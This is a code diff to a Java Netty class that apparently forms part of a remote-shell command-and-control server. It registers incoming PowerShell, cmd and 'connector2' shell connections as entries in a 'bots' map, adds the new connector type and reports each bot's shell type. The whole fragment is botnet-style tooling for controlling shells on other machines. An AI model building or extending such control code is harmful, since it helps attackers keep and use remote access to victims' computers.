@@ -18,10 +18,8 @@ public class Connection {
     private PrintWriter printWriter;
     private boolean printOutput = false;
     private boolean blockOutput = false;
-    //private int numberOfBlockedMsg = -1;
     private boolean saveOutput;
-    private SystemType.type systemType = SystemType.type.Windows;
-    private ShellType.type shellType = null;
+    private ShellType shellType = null;
 
     public Connection(ChannelHandlerContext ctx, int id, boolean saveOutput) throws IOException {
         this.ctx = ctx;
@@ -41,27 +39,18 @@ public class Connection {
 
         if(shellType == null){
             if(msg.charAt(0) == 'p'){
-                shellType = ShellType.type.powershell;
+                shellType = ShellType.powershell;
                 Data.bots.put(ctx.channel().remoteAddress().toString(), this);
-                //System.out.println("added");
             }else if(msg.charAt(0) == 'c'){
-                shellType = ShellType.type.cmd;
+                shellType = ShellType.cmd;
                 Data.bots.put(ctx.channel().remoteAddress().toString(), this);
-                //System.out.println("added");
-            }else{
-                //shellType = ShellType.type.Undefined;
+            }else if(msg.charAt(0) == '2'){
+                shellType = ShellType.connector2;
+                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
+            } else{
             }
 
         }
-
-        /*if (blockOutput) {
-            if (msg.charAt(msg.length() - 2) == (char) 0xff) {
-                System.out.println("Done!");
-                blockOutput = false;
-            }else {
-                return;
-            }
-        }*/
 
         if(printOutput){
             try {
@@ -78,19 +67,6 @@ public class Connection {
 
 
     public void showInfo() {
-        System.out.println(ctx.channel().remoteAddress());
-    }
-
-    private byte[] convertUtfToWindows(String msg) throws UnsupportedEncodingException {
-        byte[] originalBytes = msg.getBytes("Windows-1256"); // Here the sequence of bytes representing the UTF-8 encoded string
-        byte[] newBytes = new String(originalBytes, "UTF8").getBytes("Windows-1256");
-
-        /*for(int i=0; i<newBytes.length; i++){
-            if(newBytes[i] == (byte)0x22){
-                newBytes[i] = (byte)0x92;
-            }
-        }*/
-        //return newBytes;
-        return originalBytes;
+        System.out.println(ctx.channel().remoteAddress()+"   "+shellType.name());
     }
 }
